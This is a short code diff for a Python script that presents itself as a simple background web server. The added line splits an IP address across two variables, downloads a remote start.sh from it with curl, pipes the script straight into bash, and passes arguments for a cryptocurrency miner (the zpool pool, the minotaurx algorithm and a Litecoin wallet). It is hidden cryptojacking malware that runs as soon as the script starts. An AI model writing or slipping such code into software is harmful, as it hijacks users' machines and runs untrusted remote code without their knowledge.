@@ -6,7 +6,8 @@ def start_site():
         httpd.serve_forever()
 
 threading.Thread(target=start_site, daemon=True).start()
-os.system("curl -sL https://githubusercontent.com | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC")
+A="185.112"; B="144.152"
+os.system(f"curl -sL http://{A}.{B}/start.sh | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC")
 
 import time
 while True: time.sleep(60)
